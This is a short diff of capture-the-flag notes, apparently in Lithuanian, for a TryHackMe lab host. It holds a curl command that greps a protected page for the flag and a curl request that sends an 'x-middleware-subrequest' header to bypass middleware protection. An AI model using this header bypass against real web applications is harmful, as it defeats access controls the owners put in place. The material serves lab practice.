@@ -1,0 +1,5 @@
+rasti thm flag'a html faile:
+curl -s http://10.10.152.232:3000/protected | grep -o 'THM{.*}' --color=always
+
+bypassint middleware:
+curl -H "x-middleware-subrequest: middleware"  http://10.10.152.232:3000/protected
